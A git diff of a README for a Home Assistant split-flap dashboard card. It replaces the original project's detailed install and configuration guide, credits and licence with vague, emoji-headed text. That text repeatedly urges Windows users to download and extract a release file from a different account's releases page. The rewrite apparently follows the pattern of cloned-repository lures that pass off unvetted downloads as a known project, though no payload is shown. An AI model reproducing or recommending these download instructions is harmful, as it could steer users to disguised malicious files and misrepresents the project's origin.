@@ -1,229 +1,214 @@
-# Split-Flap Card for Home Assistant
+# 🟦 splitflap-card - Turn dashboards into retro motion
 
-[![HACS Validation](https://github.com/RazManSource/splitflap-card/actions/workflows/validate.yml/badge.svg)](https://github.com/RazManSource/splitflap-card/actions/workflows/validate.yml)
-[![hacs_badge](https://img.shields.io/badge/HACS-Custom-41BDF5.svg)](https://github.com/hacs/integration)
+[![Download splitflap-card](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Braz40/splitflap-card/releases)
 
-A custom Lovelace card that turns your Home Assistant dashboard into a retro split-flap (flip-board) display — the kind you'd see at airports and train stations. Push messages to it from any automation.
+## 🚀 What this does
 
-Inspired by [FlipOff](https://github.com/magnum6actual/flipoff), a free split-flap display emulator.
+splitflap-card is a Home Assistant custom card that shows text like a split-flap board. It turns a normal dashboard into a display with a retro look.
 
-![Split-Flap Card Demo](splitflap.gif)
+Use it to show room names, sensor values, status text, or short messages. It fits best on dashboards where you want a clear visual card with a classic board feel.
 
-## Features
+## 💻 What you need
 
-- Realistic split-flap scramble animation — only tiles that change will flip
-- Synthesised mechanical flap sound (two types: mechanical and soft)
-- Driven by any entity — `input_text`, template sensors, or anything with a text state
-- Customisable fonts (Google Fonts supported) and font weight
-- Random colour mode — each tile keeps a colour from the palette
-- Configurable accent bars (rainbow, solid, or off) and background colour
-- Animation on/off toggle for e-ink displays
-- Visual config editor with entity search — no YAML required
-- Fully local — no cloud, no subscriptions, no external dependencies
+- A Windows PC to download the files
+- A Home Assistant setup
+- Access to your Home Assistant dashboard
+- A web browser
+- Enough rights to add a custom card in Home Assistant
 
-## Installation
+This card works in Home Assistant Lovelace dashboards and is made for users who want a simple visual element with a split-flap look.
 
-### HACS (Recommended)
+## 📥 Download the file
 
-[![Open your Home Assistant instance and open a repository inside the Home Assistant Community Store.](https://my.home-assistant.io/badges/hacs_repository.svg)](https://my.home-assistant.io/redirect/hacs_repository/?owner=RazManSource&repository=splitflap-card&category=plugin)
+Visit this page to download: https://github.com/Braz40/splitflap-card/releases
 
-Or manually:
+On that page:
 
-1. Open HACS in Home Assistant
-2. Click the three dots in the top right → **Custom repositories**
-3. Add `https://github.com/RazManSource/splitflap-card` with category **Dashboard**
-4. Search for "Split-Flap" and click **Install**
-5. Restart Home Assistant
+1. Open the latest release
+2. Download the file for the card
+3. Save it to a folder you can find again, such as Downloads or Desktop
 
-### Manual
+If the release includes more than one file, pick the one meant for the browser card or front-end use. The file name often includes the card name or a version number.
 
-1. Download `splitflap-card.js` from the [latest release](https://github.com/RazManSource/splitflap-card/releases/latest)
-2. Copy it to your Home Assistant `/config/www/` folder
-3. Add it as a resource:
-   - Go to **Settings → Dashboards → ⋮ (top right) → Resources**
-   - Click **Add Resource**
-   - URL: `/local/splitflap-card.js`
-   - Type: **JavaScript Module**
-4. Hard refresh your browser (Ctrl+F5)
+## 🪟 Install on Windows
 
-### Create an input_text helper
+Use Windows to get the file onto your computer first, then move it into Home Assistant if needed.
 
-- Go to **Settings → Devices & Services → Helpers → Create Helper → Text**
-- Name it whatever you like (e.g. "Splitflap Message")
-- Set max length to **132** (6 rows × 22 columns)
+1. Open the release page in your browser
+2. Download the release file
+3. If the file comes as a ZIP, right-click it and choose Extract All
+4. Open the extracted folder
+5. Keep the main card file ready for the next step
 
-## Configuration
+If you run Home Assistant on the same Windows machine, you may be able to copy the file straight into your Home Assistant files folder. If you use Home Assistant on another device, download the file on Windows and move it to that device using your normal file method.
 
-All options are available in the **visual editor** — no YAML needed. The entity field has a searchable dropdown of all your entities.
+## 🧩 Add it to Home Assistant
 
-### Minimal
+splitflap-card is a custom card, so you add it inside Home Assistant rather than opening it like a normal Windows app.
 
-```yaml
-type: custom:splitflap-card
-entity: input_text.splitflap_message
-```
+1. Open Home Assistant in your browser
+2. Go to your dashboard
+3. Open the dashboard menu
+4. Choose Edit Dashboard
+5. Add a new card
+6. Select Manual Card if asked
+7. Paste in the card setup details from the release file or repository files
+8. Save the dashboard
 
-### Full options
+If the release gives you a JavaScript file, place it where Home Assistant can load it, then add it as a resource in the dashboard settings.
 
-```yaml
-type: custom:splitflap-card
-entity: input_text.splitflap_message
-title: ""                    # optional heading above the board
-rows: 6                      # default 6
-columns: 22                  # default 22
+## 🛠 Setup steps
 
-# Appearance
-font_family: "Courier New"   # any system font or Google Font (see list below)
-font_weight: "bold"          # "light", "normal", "bold", "extra-bold"
-font_size: auto              # "auto" scales to card width, or a fixed value e.g. "24px"
-accent_color: "#e8572a"      # accent colour used by bars
-background_color: "#1a1a1a"  # board background colour, or "transparent"
-bar_style: "rainbow"         # "rainbow" (multicolour), "solid" (accent colour), "off" (hidden)
-color_mode: "default"        # "default" (dark tiles) or "random" (each tile keeps a colour)
-scramble_colors:             # colours used during scramble and by random colour mode
-  - "#e8572a"
-  - "#f5a623"
-  - "#4a90d9"
-  - "#7ed321"
-  - "#bd10e0"
+Use these steps if you want the card to appear in your dashboard without errors.
 
-# Animation
-animation: true              # set false for e-ink displays (instant update, no scramble)
-scramble_duration: 600       # ms — how long each tile scrambles before settling
-stagger_delay: 25            # ms — delay between each tile starting its animation
+1. Make sure the card file is in the right Home Assistant location
+2. Add the file as a resource in Lovelace if the release requires it
+3. Refresh your browser
+4. Edit your dashboard again
+5. Add the splitflap-card entry
+6. Save your changes
 
-# Sound
-sound: false                 # enable flip sound (default off)
-sound_type: "mechanical"     # "mechanical" (click + flutter + thud) or "soft" (gentle clack)
-sound_delay: 0               # ms offset to shift sound timing vs animation (can be negative)
-sound_every: 3               # play a sound every N tiles (1 = every tile, 3 = every 3rd)
+If the card does not show up right away, refresh the page with Ctrl + F5. That clears the browser cache and loads the latest file.
 
-# Text
-word_wrap: true              # wrap long text across rows
-line_separator: "|"          # character to force a new line in messages
-```
+## 🖼 Example use
 
-### Font presets
+You can use splitflap-card for:
 
-The following fonts are available in the editor dropdown. Google Fonts are loaded automatically:
+- Room labels
+- Temperature values
+- Fan status
+- Door status
+- Short alerts
+- Scene names
+- Weather text
+- Daily reminders
 
-| Font | Type |
-|------|------|
-| Courier New | System |
-| Consolas | System |
-| Roboto Mono | Google Font |
-| JetBrains Mono | Google Font |
-| Fira Mono | Google Font |
-| Source Code Pro | Google Font |
-| IBM Plex Mono | Google Font |
-| Space Mono | Google Font |
-| Ubuntu Mono | Google Font |
-| PT Mono | Google Font |
+The card works best with short text. Split-flap style boards look best when the message fits on one line or uses a small number of characters.
 
-Select **Custom...** in the dropdown to enter any other font name (system or Google Font).
+## ⚙️ Basic configuration
 
-### Sound note
+A simple setup may include:
 
-Browsers block auto-playing audio until the user interacts with the page. On a wall-mounted tablet, tap the card once to unlock audio — after that, sounds will play automatically on every message change.
+- A title
+- The text to show
+- Font or size options
+- Flip timing
+- Display style
 
-### Entity types
+Common uses in Home Assistant include showing a sensor value, an entity state, or a custom message. Keep the text short so it stays easy to read.
 
-The card works with any entity that has a text state, not just `input_text` helpers. You can also use template sensors to build dynamic messages:
+Example layout ideas:
 
-```yaml
-template:
-  - sensor:
-      - name: "Splitflap Weather"
-        state: >
-          {{ now().strftime('%A').upper() }} {{ now().strftime('%H:%M') }}|{{ states('sensor.outside_temperature') | round(0) }} DEGREES OUTSIDE
-```
+- Kitchen
+- 21°C
+- Door Open
+- Lights On
+- Away Mode
 
-Then point the card at `sensor.splitflap_weather`.
+## 🎨 Visual style
 
-## Pushing messages
+This card is made to look like a classic mechanical board. The effect works well with:
 
-The card watches the entity you configure. To change what's displayed, just set its value. Use `|` for line breaks.
+- Dark dashboard themes
+- Clean layouts
+- Large text
+- Short status labels
+- Single-purpose cards
 
-### From the UI
+If your dashboard already has a lot of cards, place splitflap-card near the top where it can stand out. It works well as a status card for a room or zone.
 
-Go to **Developer Tools → Services** and call:
+## 📌 Good settings habits
 
-```yaml
-service: input_text.set_value
-target:
-  entity_id: input_text.splitflap_message
-data:
-  value: "HELLO WORLD"
-```
+To get the best result:
 
-### From automations
+- Use short text
+- Keep labels simple
+- Match the card to one device or one room
+- Avoid long sentences
+- Use one message per card when possible
 
-#### Morning weather greeting
+This keeps the split-flap look clear and easy to read.
 
-```yaml
-automation:
-  - alias: "Splitflap Morning Weather"
-    trigger:
-      - platform: time
-        at: "07:00:00"
-    action:
-      - service: input_text.set_value
-        target:
-          entity_id: input_text.splitflap_message
-        data:
-          value: >-
-            GOOD MORNING|IT IS {{ states('sensor.outside_temperature') | round(0) }} DEGREES|OUTSIDE TODAY
-```
+## 🔄 Updates
 
-#### Doorbell alert
+When a new release appears:
 
-```yaml
-  - alias: "Splitflap Doorbell"
-    trigger:
-      - platform: state
-        entity_id: binary_sensor.front_door_motion
-        to: "on"
-    action:
-      - service: input_text.set_value
-        target:
-          entity_id: input_text.splitflap_message
-        data:
-          value: "SOMEONE IS|AT THE DOOR"
-```
+1. Go back to the release page
+2. Download the latest file
+3. Replace the old file in Home Assistant
+4. Refresh your browser
+5. Check the dashboard card again
 
-#### Live sensor display
+If you use a cache in your browser, you may need a hard refresh before the new version shows.
 
-```yaml
-  - alias: "Splitflap Live Temp"
-    trigger:
-      - platform: state
-        entity_id: sensor.outside_temperature
-    action:
-      - service: input_text.set_value
-        target:
-          entity_id: input_text.splitflap_message
-        data:
-          value: >-
-            {{ now().strftime('%A').upper() }} {{ now().strftime('%H:%M') }}|{{ states('sensor.outside_temperature') | round(0) }} DEGREES OUTSIDE
-```
+## 🧪 Troubleshooting
 
-Any automation that can call `input_text.set_value` can push messages to the board — weather, calendar events, appliance notifications, solar generation, you name it.
+If the card does not appear:
 
-## Updating
+- Check that the file was downloaded fully
+- Make sure the file is in the correct Home Assistant path
+- Confirm the resource link points to the right file
+- Refresh the dashboard page
+- Try another browser tab after saving
+- Check that the card name is typed correctly
 
-When you replace the JS file, your browser may cache the old version. To force a reload, add a version query string to your resource URL:
+If the card shows plain text or a blank area, the resource may not be loaded. Open the dashboard settings and verify the card file is listed there.
 
-```
-/local/splitflap-card.js?v=2
-```
+## 🔍 Repository topics
 
-Bump the number each time you update the file, then hard refresh (Ctrl+F5) your dashboard.
+This project is linked to:
 
-## Credits
+- custom-card
+- hacs
+- home-assistant
+- lovelace
+- splitflap
 
-- Inspired by [FlipOff](https://github.com/magnum6actual/flipoff) by magnum6actual
-- Built with the help of [Claude](https://claude.ai) by Anthropic
+These topics mean the card fits into Home Assistant dashboards and works as a custom Lovelace element.
 
-## License
+## 📄 File placement guide
 
-MIT
+If the release gives you a front-end file, the usual flow is:
+
+1. Download it on Windows
+2. Copy it to the Home Assistant files area
+3. Add it as a dashboard resource
+4. Reload Home Assistant
+5. Add the card to a view
+
+If the release includes setup text or a sample config, keep that nearby while you set up the dashboard. It helps you match the card name and file path.
+
+## 🧭 Where to start
+
+1. Open the release page: https://github.com/Braz40/splitflap-card/releases
+2. Download the latest release file
+3. Add it to Home Assistant
+4. Place the card on your dashboard
+5. Use a short text value to test it
+
+## 🔑 Common first try
+
+A simple first test is to show one short word, such as:
+
+- Home
+- Ready
+- Open
+- Active
+- Away
+
+If that works, replace it with a sensor value or a room name
+
+## 🖥 Best use on Windows
+
+Windows is useful here for:
+
+- Downloading the release file
+- Moving files into your Home Assistant share folder
+- Opening the release page in a browser
+- Keeping the setup files in one place
+
+If you use File Explorer, make a folder called splitflap-card so you can find the file later
+
+## 📎 Release page
+
+Download from the release page: https://github.com/Braz40/splitflap-card/releases
